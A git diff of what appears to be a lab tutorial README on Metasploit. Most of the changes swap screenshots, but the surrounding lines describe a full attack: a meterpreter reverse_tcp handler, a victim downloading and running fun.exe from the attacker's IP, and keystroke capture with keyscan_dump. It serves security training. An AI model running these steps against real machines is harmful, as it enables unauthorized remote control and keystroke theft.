@@ -80,9 +80,14 @@ Start apache server ```sudo systemctl apache2 start```
 
 
 Check the status of apache2 ```sudo apache2 status```
+
+
+
 <img width="563" height="708" alt="image" src="https://github.com/user-attachments/assets/fc28846a-940d-482e-afda-cb1fc2987805" />
 
 Invoke msfconsole:
+
+
 <img width="588" height="482" alt="image" src="https://github.com/user-attachments/assets/6e0d9018-cf50-4370-b561-74c9b40d18ae" />
 
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
@@ -90,8 +95,8 @@ Type help or a question mark "?" to see the list of all available commands you c
 Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```
 
 ### Output 
+<img width="719" height="112" alt="image" src="https://github.com/user-attachments/assets/dbfbd573-6bd3-43b3-bec6-b232a7ca989b" />
 
-<img width="812" height="510" alt="image" src="https://github.com/user-attachments/assets/d481703f-382a-413a-b279-113de8c612a5" />
 
 
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.
@@ -101,6 +106,7 @@ On the target Windows machine, open a Web browser and open this URL, replacing t
 Bypass any warning boxes, double-click the file, and allow it to run.
 On kali give the command exploit
 
+<img width="495" height="72" alt="image" src="https://github.com/user-attachments/assets/a70aa14c-ad12-45d4-a01e-4dcd78d309f0" />
 
 
 
@@ -116,7 +122,8 @@ The target is now owned. Following are meterpreter commands for key capturing in
 
 
 keyscan_dump Shows the keystrokes captured so far
-<img width="1920" height="936" alt="Screenshot_2025-10-02_13_46_21" src="https://github.com/user-attachments/assets/9a1044ce-b2ce-43a7-9c68-41bedc450331" />
+
+<img width="649" height="400" alt="image" src="https://github.com/user-attachments/assets/37ca6a30-076f-4f2e-8fc0-1651f56cb08f" />
 
 
 
